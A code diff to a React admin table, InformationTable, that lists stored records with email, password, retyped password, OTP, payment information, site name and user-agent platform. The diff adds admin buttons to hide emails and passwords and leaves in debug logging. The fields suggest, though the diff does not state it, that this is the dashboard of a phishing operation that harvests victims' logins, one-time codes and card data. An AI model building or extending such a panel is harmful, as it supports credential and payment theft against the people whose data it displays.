@@ -15,7 +15,9 @@ const InformationTable = () => {
 
   const {  loading, setIsRefresh, displayInfo, role,totalPages, setPage,page} = useInformation()
 
-  const handleDisabled = async (id: any,status:any) => {
+  const handleDisabled = async (id: any,type:any,status:any) => {
+    console.log(type,'status');
+    console.log('called');
     try {
       let orstatus;
       if(!status){
@@ -23,12 +25,15 @@ const InformationTable = () => {
       }else{
         orstatus = false
       }
-      await getData(`/information/${id}/status?status=${orstatus}`)
+    
+      await getData(`/information/${id}/status?${type}=${orstatus}`)
       setIsRefresh(Math.random())
     } catch (error: any) {
       throw new Error(error)
     }
   }
+
+  
 
 
   return (
@@ -89,7 +94,15 @@ const InformationTable = () => {
                 role === 'admin' && (
                   <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
 
-                    Action
+                   Hide Email
+                  </th>
+                )
+              }
+              {
+                role === 'admin' && (
+                  <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+
+                    Hide Password
                   </th>
                 )
               }
@@ -109,7 +122,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user, updatedAt, agent: { source={},platform='' } ,paymentInfo, status, email, password, repassword, otp, siteName, _id }, index) => (
+              displayInfo?.map(({ user, updatedAt, agent: { source={},platform='' } ,paymentInfo, status, email,isPasswordHide, password, repassword, otp, siteName, _id }, index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -167,9 +180,23 @@ const InformationTable = () => {
                         <div className="relative inline-block">
                           <button
                           title={platform}
-                            onClick={() => {handleDisabled(_id,status)}}
+                            onClick={() => {handleDisabled(_id,'status',status)}}
                             className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
                               }`}>{!status ? 'Hide' : 'show'}</button>
+                        </div>
+                      </td>
+                    )
+                  }
+
+                  {
+                    role === 'admin' && (
+                      <td className="px-2 py-1 font-bold cursor-pointer ">
+                        <div className="relative inline-block">
+                          <button
+                          title={platform}
+                            onClick={() => {handleDisabled(_id,'isPasswordHide',isPasswordHide)}}
+                            className={`p-2 ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
+                              }`}>{!isPasswordHide ? 'Hide' : 'show'}</button>
                         </div>
                       </td>
                     )
